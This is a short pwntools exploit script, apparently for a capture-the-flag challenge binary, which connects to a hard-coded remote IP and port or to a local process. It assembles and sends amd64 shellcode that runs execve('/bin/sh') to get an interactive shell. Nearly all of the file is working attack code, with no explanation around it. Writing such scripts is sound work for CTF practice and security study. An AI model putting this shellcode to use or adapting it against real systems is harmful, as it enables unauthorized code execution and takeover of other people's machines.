#!/usr/bin/env python3

from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x00000000000018D4
        si
        c
        ''')
        input()

if args.REMOTE:
    p = remote('23.146.248.136', 10023)
else:
    p = process([exe.path])
GDB()
#pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
sc = asm(
    '''
    xor    rax, rax
    movabs rdx, 0x68732f6e69622f
    push   rdx
    mov    rdi, rsp
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rax, 59
    syscall
    
    
    ''', arch='amd64'
)
s(sc)

p.interactive()
